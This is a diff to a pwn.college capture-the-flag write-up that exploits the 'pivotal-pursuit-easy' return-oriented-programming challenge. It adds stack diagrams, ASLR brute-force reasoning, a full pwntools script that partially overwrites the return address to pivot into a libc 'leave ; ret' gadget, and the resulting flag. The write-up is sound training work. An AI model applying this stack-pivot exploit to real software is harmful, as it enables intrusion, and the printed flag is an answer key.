@@ -10946,9 +10946,9 @@ Breakpoint 1 at 0x2207
 pwndbg> run
 Starting program: /challenge/pivotal-pursuit-easy 
 Downloading separate debug info for system-supplied DSO at 0x7ffedfbb8000
-Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffedfbb8000.                                                                                                                  
+Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffedfbb8000.
 Downloading separate debug info for /lib/libcapstone.so.5
-Download failed: Invalid argument.  Continuing without separate debug info for /lib/libcapstone.so.5.                                                                                                                                  
+Download failed: Invalid argument.  Continuing without separate debug info for /lib/libcapstone.so.5.
 ###
 ### Welcome to /challenge/pivotal-pursuit-easy!
 ###
@@ -11030,7 +11030,7 @@ Breakpoint hit at 0x64b6f3eb9207
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-- [ ] Offset between the location of the buffer and the location of the stored return pointer
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
    - Location of the buffer: `0x7ffedfb5b0f8`
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
@@ -11053,7 +11053,7 @@ $1 = 112
 
 - [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
    - Location of the buffer: `0x7ffedfb5b0f8`
-   - Location of the saved return pointer: `0x7ffedfb5b0f8` 
+   - Location of the saved return pointer: `0x7ffedfb5b168`
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
@@ -11135,3 +11135,161 @@ hacker@return-oriented-programming~pivotal-pursuit-easy:~$ ROPgadget --binary /l
 0x00000000000578c3 : test dword ptr [rbp], edi ; add byte ptr [rax], al ; leave ; ret
 ```
 
+The saved RIP is `0x776c533e8083` (`__libc_start_main+243`, libc offset `0x24083`). The `leave ; ret` gadget is at libc offset `0x578c8`. Since both the saved RIP and the gadget live within libc, a partial overwrite of the saved RIP stays within the same mapping.
+
+A **2-byte** overwrite locks byte 2 of the resulting address to `0x3e` (the current value in the saved RIP), which constrains which ASLR base values can ever succeed — only those where byte 2 of `libc_base + 0x578c8` happens to equal `0x3e`, roughly a 2/256 chance. A **3-byte** overwrite instead replaces the low 3 bytes of the saved RIP entirely, leaving the upper 5 bytes intact (same libc mapping), which is both correct and far more efficient.
+
+ASLR randomizes 28 bits of the libc base (bits 12–39). Since the base is always page-aligned (low 12 bits = `0x000`), the lower nibble of byte 1 of any libc gadget address is always `0x0`. This leaves **4 bits (upper nibble of byte 1) × 8 bits (byte 2) = 4096 possible 3-byte patterns** to enumerate.
+
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
+   - Location of the buffer: `0x7ffedfb5b0f8`
+   - Location of the saved return pointer: `0x7ffedfb5b168`
+- [x] Locations of required ROP gadgets: `leave ; ret` at libc offset `0x578c8` → 4096-way brute force
+- [x] Offset of the overwritten stored base pointer value from the buffer: `104` (we write `buf - 16`)
+
+### ROP chain: Stack pivot + ret2win
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            buf - 16       │  .. .. .. .. .. .. .. ..  │  ( garbage / don't care )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            buf -  8       │   pointer to win()         │  --> ( win() )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsi --> buf +  0       │  41 41 41 41 41 41 41 41  │  ( b"AAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │  ....
+                      .... │  .. .. .. .. .. .. .. ..  │  ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rbp --> buf + 104      │   buf - 16                 │  ( overwritten saved RBP )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> buf + 112      │   ?? ?? ??                 │  --> ( leave ; ret in libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> main() return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            buf - 16       │  .. .. .. .. .. .. .. ..  │
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            buf -  8       │   pointer to win()         │  --> ( win() )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            buf +  0       │  41 41 41 41 41 41 41 41  │
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rbp --> buf + 104      │   buf - 16                 │
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> leave ; ret  (main epilogue)
+	// leave: mov rsp, rbp → rsp = buf + 104
+	//        pop rbp      → rbp = buf - 16,  rsp = buf + 112
+	// ret:   rip = leave ; ret gadget in libc
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            buf - 16       │  .. .. .. .. .. .. .. ..  │
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> buf -  8       │   pointer to win()         │  --> ( win() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rbp: buf - 16
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> leave ; ret  (libc gadget)
+	// leave: mov rsp, rbp → rsp = buf - 16
+	//        pop rbp      → rbp = [buf - 16] (don't care),  rsp = buf - 8
+	// ret:   rip = [buf - 8] = win()  ✓
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> buf -  8       │   pointer to win()         │
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> win()
+	// open("/flag", O_RDONLY)
+	// read(fd, rsp, 0x100)
+	// write(1, rsp, n)   → flag printed to stdout
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+### Brute Force
+
+We enumerate all 4096 valid 3-byte patterns for `leave ; ret` at libc offset `0x578c8`. Each attempt spawns a fresh process (new ASLR roll), sends the payload, and checks stdout for `pwn.college{`. Expected attempts to first hit: ~4096.
+
+```python
+patterns = []
+for b2 in range(256):
+    for N in range(16):
+        val = (b2 * 0x10000 + N * 0x1000 + 0x578c8) & 0xFFFFFF
+        patterns.append(val.to_bytes(3, "little"))
+```
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+import random
+
+context.arch = "amd64"
+context.log_level = "error"
+
+rbp_offset = 104
+
+patterns = []
+for b2 in range(256):
+    for N in range(16):
+        val = (b2 * 0x10000 + N * 0x1000 + 0x578c8) & 0xFFFFFF
+        patterns.append(val.to_bytes(3, "little"))
+random.shuffle(patterns)
+
+for pat in patterns * 20:
+    p = None
+    try:
+        p = process("/challenge/pivotal-pursuit-easy")
+        p.recvuntil(b"located at: ", timeout=5)
+        buf = int(p.recvline().strip().rstrip(b"."), 16)
+        p.send(b"A" * rbp_offset + p64(buf - 16) + pat)
+        out = p.recvall(timeout=2)
+        if b"pwn.college{" in out:
+            print(out.decode(errors="ignore"))
+            break
+    except Exception:
+        pass
+    finally:
+        if p:
+            try: p.close()
+            except: pass
+```
+
+```
+hacker@return-oriented-programming~pivotal-pursuit-easy:~$ python ~/script.py
+
+The win function has just been dynamically constructed at 0x718864935000.
+Received 115 bytes! This is potentially 0 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 1 gadgets of ROP chain at 0x7ffd83800d78.
+| 0x000071886372c8c8: leave  ; ret  ; 
+
+Leaving!
+### Goodbye!
+pwn.college{orp505Xqzn5aiXZ3gTgAFgUFRGK.01M2MDL4ITM0EzW}
+```
